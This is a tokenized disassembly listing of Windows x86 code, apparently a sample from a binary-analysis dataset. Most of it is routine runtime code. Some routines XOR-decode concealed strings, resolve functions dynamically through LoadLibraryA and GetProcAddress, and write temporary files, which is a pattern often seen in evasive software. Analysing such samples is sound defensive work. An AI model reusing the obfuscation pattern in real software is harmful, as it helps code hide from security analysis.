mov ecx [ ebp - 0x4 ]
fstp [ esi + 0x10 ]
mov edx [ ebx + 0x18 ]
pop edi
mov [ esi + 0x18 ] edx
mov eax esi
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001a720
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1001a788
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_1001a7d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ac0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ebp - 0x2c ]
call sub_10022f50
mov [ ebp - 0x4 ] 0x0
mov edi [ eax + 0x10 ]
mov esi 0x8
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
mov eax [ rw-data ]
mov ecx rw-data
call sub_1005e510
test eax eax
setne bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ eax ]
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] cx
test bl bl
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
lea esi [ ebp - 0x48 ]
call sub_10022f50
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_10051390
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001a8af
push 0x8
mov eax sub_1007eee2
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1006312b
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1001bc97
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10047b65
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10047b65
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10047b65
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10047b65
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_1001a1b3
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10078600
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_10078600
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10009b93
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10009b93
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1001a9f0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
push ebx
push esi
push edi
mov edi [ ecx + 0x10 ]
cmp eax edi
jae r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
sub edi eax
cmp edx edi
ja r-xdata
mov esp ebp
pop ebp
retn 0xc
mov esi 0x1
sub esi edx
add edi esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
lea ebx [ ecx + eax ]
mov eax [ ebp + 0x8 ]
movsx ecx [ eax ]
push edi
push ecx
push ebx
call sub_100783e0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov ecx [ ecx ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
push esi
call sub_10068a30
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
movsx edx [ ecx ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push edx
lea ebx [ esi + 0x1 ]
push ebx
call sub_100783e0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
sub eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_1001aaa0
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x110 ]
push eax
push 0x104
xor esi esi
call [ GetTempPathA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov esi [ r--data ]
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x32
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
mov eax [ edi + 0x37c ]
push ebx
push eax
lea ecx [ eax + 0x1 ]
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x5 ] 0x0
mov [ edi + 0x37c ] ecx
call [ GetTempFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001ab50
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0x6e
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x19 ] 0x0
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x40 ] ebx
test ebx ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0x2e
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x7 ] 0x0
call esi
mov [ ebp - 0x44 ] eax
test eax eax
jne r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov eax 0xc
call sub_10057840
mov ecx edi
push ecx
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x30 ]
mov eax 0xd1
call sub_10057840
mov eax [ ebp - 0x40 ]
mov edx edi
push edx
push eax
call esi
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x3 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x3c ]
push ecx
push 0xffffffff
push sub_1001f2e0
push sub_10069090
push sub_1005f830
push sub_1003eb00
push sub_10011700
push sub_10007bb0
push sub_10028d70
call [ ebp - 0x44 ]
mov esi eax
add esp 0x24
test esi esi
jne r-xdata
lea eax [ edi + 0x4 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push sub_10060af0
push 0x0
push r--data
push r--data
push esi
call ebx
add esp 0x1c
push esi
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x5 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call edi
mov edx [ ebp - 0x40 ]
add esp 0x4
push edx
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call edi
add esp 0x4
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1001ad10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ eax + 0x104 ] edx
jbe r-xdata
pop ebp
retn 0x8
push ebx
push esi
pop esi
pop ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax r--data
jne r-xdata
inc eax
cmp eax r--data
jne r-xdata
mov cl [ eax + edx ]
mov eax r--data
movsx esi cl
mov edi edi
sub eax [ ebp + 0xc ]
sub eax r--data
and eax 0x3f
mov al [ eax + r--data ]
mov al cl
jmp r-xdata
movzx ebx [ eax ]
cmp ebx esi
je r-xdata
mov al cl
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp edx [ edi + 0x10 ]
jae r-xdata
mov [ ecx + edx ] al
mov ecx [ ebp + 0x8 ]
inc edx
cmp edx [ ecx + 0x104 ]
jb r-xdata
sub_1001ad90
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_1000a3e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1001add0
push ebp
mov ebp esp
push 0xffffffff
push sub_100818ae
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a4 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1a0 ] edx
mov [ ebp - 0x1a8 ] ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
lea ebx [ eax + 0xe8 ]
mov eax [ ebx + 0x10 ]
push r--data
xor edi edi
mov ecx ebx
call sub_1005e510
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
lea eax [ edi + 0x66 ]
call sub_100328b0
push esi
lea esi [ ebp - 0x9c ]
call sub_1003a620
mov esi eax
push r--data
lea edx [ ebp - 0x144 ]
push ebx
push edx
mov [ ebp - 0x4 ] edi
call sub_10027c00
mov ecx eax
mov eax esi
lea edi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0x1
call sub_10021620
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x2
call sub_10045750
add esp 0x14
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor edi edi
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
cmp [ ebp - 0x130 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x144 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov edx [ ebp - 0x144 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x80 ]
xor edx edx
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] dx
cmp [ ebp - 0x6c ] ebx
jae r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10065045
add esp 0x4
push edi
push 0x80
push 0x4
push edi
push edi
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x19c ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x80 ]
push 0x2
push edi
push edi
push eax
call [ SetFilePointer@IAT ]
lea edx [ ebp - 0x48 ]
mov eax 0x64
call sub_100328b0
mov ecx [ ebp - 0x1a0 ]
push ecx
lea esi [ ebp - 0x160 ]
call sub_1003a620
mov edi eax
mov edx [ ebp - 0x1a4 ]
push edx
lea esi [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x7
call sub_1003a620
push eax
lea edx [ ebp - 0x48 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] bl
call sub_10036350
push eax
mov edx r--data
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x9
call sub_10045750
mov ecx eax
mov eax edi
lea edi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xa
call sub_10021620
push eax
mov edx r--data
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_10045750
add esp 0x14
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
cmp [ ebp - 0x6c ] ebx
jb r-xdata
mov esi 0x7
xor edi edi
xor ecx ecx
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x80 ]
push eax
jmp r-xdata
xor eax eax
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_10065045
add esp 0x4
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0x168 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] edi
mov [ ebp - 0x17c ] cx
mov [ ebp - 0x4 ] 0x11
cmp [ ebp - 0x14c ] ebx
jb r-xdata
mov eax [ ebp - 0x17c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x160 ] ax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] edi
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x54 ]
push edi
mov edi [ WriteFile@IAT ]
lea ecx [ ebp - 0x1ac ]
push ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x19c ]
push ecx
push eax
push edx
call edi
lea edx [ ebp - 0x30 ]
mov eax 0x3
call sub_100328b0
mov ebx [ ebp - 0x1a8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x198 ]
push ecx
call sub_10067590
push eax
mov edx r--data
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x12
call sub_10045750
add esp 0xc
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x13
call sub_10051390
mov ebx 0x8
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
lea eax [ ebp - 0x64 ]
xor eax eax
mov [ ebp - 0xf8 ] 0x7
mov [ ebp - 0xfc ] 0x0
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x184 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x64 ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov ecx [ ebp - 0x198 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x54 ]
mov esi [ ebp - 0x19c ]
push 0x0
lea edx [ ebp - 0x1ac ]
push edx
lea edx [ ecx + ecx ]
push edx
push eax
push esi
call edi
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0x50 ] ebx
jb r-xdata
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x6c ] ebx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x80 ]
push edx
sub_1001b230
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1001b271
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1001b300
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_1001b334
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10044fed
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_1007c0a6
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_1007c108
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_10078ac0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1007c1fd
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_1007c5f7
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_1007c0a6
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_1007c590
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_1007c5f7
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_1007c590
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_10005e18
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1003a565
add esp 0x10
sub_1001b530
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebx * 8 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x2
lea eax [ edx + edx * 2 ]
lea ecx [ eax + eax ]
lea eax [ ebx * 8 ]
sub eax ecx
sub eax 0x2
je r-xdata
add edx 0x3
sub eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ebx
push esi
push edi
shr edx 0x1
lea edx [ edx + edx * 2 ]
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
lea edi [ ebp - 0x8 ]
lea esi [ ebp + 0x10 ]
lea eax [ ebp + 0x8 ]
call sub_10032420
mov edx [ ebp - 0x8 ]
add esp 0x14
cmp edx ebx
jae r-xdata
mov [ eax ] edx
mov eax 0xffffffd6
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
inc edx
cmp [ eax ] edx
jae r-xdata
add edx 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
lea edi [ edx + 0x1 ]
cmp edi ebx
jae r-xdata
xor esi esi
movzx esi [ eax + 0x1 ]
jmp r-xdata
mov [ eax + 0x2 ] 0x3d
add eax 0x3
mov [ eax ] 0x3d
inc eax
jmp r-xdata
and esi 0xf
mov dl [ esi * 4 + r--data ]
mov [ eax + 0x2 ] dl
add eax 0x3
mov [ eax ] 0x3d
inc eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov edx ecx
sar edx 0x2
and edx 0x3f
mov dl [ edx + r--data ]
mov [ eax ] dl
shl ecx 0x4
mov edx esi
sar edx 0x4
add ecx edx
and ecx 0x3f
mov cl [ ecx + r--data ]
mov [ eax + 0x1 ] cl
cmp edi ebx
jae r-xdata
mov edx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
pop edi
mov [ edx ] ecx
mov [ eax ] 0x0
pop esi
sub_1001b650
push ebp
mov ebp esp
push 0xffffffff
push sub_100809b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
sub esi 0xffffff80
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
sub edi 0xffffff80
jmp r-xdata
push esi
call sub_10005600
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_1001b6ac
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1002050e
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10024d10
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_1001b6f0
push 0x10
push r--data
call sub_10078b50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_10078b95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x16
jmp r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1001401c
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_1002788e
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001b7de
mov eax [ ebp - 0x1c ]
sub_1001b7e6
push 0x4c
mov eax sub_1007e933
call sub_10007703
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_10019c00
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
